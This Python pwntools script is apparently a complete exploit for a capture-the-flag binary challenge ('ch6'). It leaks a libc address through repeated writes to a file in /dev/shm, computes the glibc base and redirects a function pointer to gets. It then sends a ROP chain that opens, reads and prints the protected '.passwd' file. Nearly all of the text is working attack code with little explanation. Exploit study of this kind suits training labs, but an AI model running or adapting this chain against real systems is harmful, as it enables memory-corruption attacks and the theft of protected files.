from pwn import *
import struct

ch6 = process("/challenge/app-systeme/ch6/ch6")
with open("/dev/shm/challenge/bin", 'w') as f:
    f.write('B' * 0x16)
ch6.send("5\n/dev/shm/challenge/bin\n0\n")
sleep(1)
with open("/dev/shm/challenge/bin", 'w') as f:
    f.write('B' * 0x28)
ch6.send("5\n/dev/shm/challenge/bin\n0\n")
sleep(1)
with open("/dev/shm/challenge/bin", 'w') as f:
    f.write('B' * 0x16)
ch6.send("5\n/dev/shm/challenge/bin\n")
sleep(1)
with open("/dev/shm/challenge/bin", 'w') as f:
    f.write('B' * 0x8)
ch6.send("0\n")
sleep(1)
resp = ch6.recv(timeout=0.5)
print("--------------------Programm responses--------------------")
print(resp)
print("---------------------------END----------------------------")
idx = resp.rindex(b'BBBBBBBB') + 8
addr = struct.unpack('q', resp[idx:idx+8])[0]
print("Leaked address: " + hex(addr))
libcBase = (addr & 0xFFFFFFFFFFFFF000) - 0x3C4000
print("Glibc base address: " + hex(libcBase))

#  readelf -s ./lib/libc.so.6 | grep gets
#  000000000006ed80   455 FUNC    WEAK   DEFAULT   13 gets@@GLIBC_2.2.5
f_gets = struct.pack('<Q', (libcBase+0x6ed80))
f_gets += b'\n'
with open("/dev/shm/challenge/bin", 'wb') as f:
    f.write(f_gets)
ch6.send("2\n/dev/shm/challenge/bin\n")
sleep(1)


#------------ generate rop chain----------
padding = b'\x41'*19
zero = struct.pack("<Q", 0)
f_exit = struct.pack("<Q", libcBase + 0x03a030)    
f_fopen = struct.pack("<Q", libcBase + 0x06dd70) 
f_fgets = struct.pack("<Q", libcBase + 0x06dad0)    
f_puts =  struct.pack("<Q", libcBase + 0x06f690)
 
p = b''
p += padding
p += struct.pack('<Q', libcBase + 0x0000000000001b92) # pop rdx ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4080) # @ .data = file_name
p += struct.pack('<Q', libcBase + 0x0000000000033544) # pop rax ; ret
p += b'.passwd\x00'
p += struct.pack('<Q', libcBase + 0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
p += struct.pack('<Q', libcBase + 0x0000000000001b92) # pop rdx ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4088) # @ .data + 8 = mode
p += struct.pack('<Q', libcBase + 0x0000000000033544) # pop rax ; ret
p += b'r\x00\x00\x00\x00\x00\x00\x00'
p += struct.pack('<Q', libcBase + 0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
p += struct.pack("<Q", libcBase + 0x00000000000202e8) # pop rsi ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4088) # @ .data + 8 = "r"
p += struct.pack('<Q', libcBase + 0x0000000000001b92) # pop rdx ; ret
p += zero
p += struct.pack("<Q", libcBase + 0x0000000000021102) # pop rdi ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4080) # @ .data  = ".passwd"
p += f_fopen
p += struct.pack('<Q', libcBase + 0x0000000000001b92) # pop rdx ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4090) # @ .data + 16 = handle
p += struct.pack('<Q', libcBase + 0x000000000002e19c) # mov qword ptr [rdx], rax ; ret
p += struct.pack("<Q", libcBase + 0x00000000000202e8) # pop rsi ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4090) # @ .data + 16 = handle
p += struct.pack("<Q", libcBase + 0x0000000000021102) # pop rdi ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c4090) # @ .data + 16 = handle
p += struct.pack("<Q", libcBase + 0x00000000000a5da0) # mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
p += struct.pack("<Q", libcBase + 0x00000000000202e8) # pop rsi ; ret
p += b'\x50\x00\x00\x00\x00\x00\x00\x00'
p += struct.pack("<Q", libcBase + 0x0000000000021102) # pop rdi ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c40a0) # @ .data + 32 = dest_buffer
p += f_fgets
p += struct.pack("<Q", libcBase + 0x00000000000202e8) # pop rsi ; ret
p += zero
p += struct.pack("<Q", libcBase + 0x0000000000021102) # pop rdi ; ret
p += struct.pack('<Q', libcBase + 0x00000000003c40a0) # @ .data
p += struct.pack('<Q', libcBase + 0x0000000000001b92) # pop rdx ; ret
p += zero
p += f_puts
p += f_exit
p += b'\n\x00\x00\x00\x00\x00\x00\x00'

print("------------------------------Payload------------------------------")
print(p)
print("--------------------------------END--------------------------------")

sleep(1)
resp = ch6.recv(timeout=0.5)
ch6.send("-8198\n")
sleep(1)
ch6.send(p)
sleep(1)
resp = ch6.recv(timeout=0.5)
print("And here is a key: ")
print(resp[4:-2])





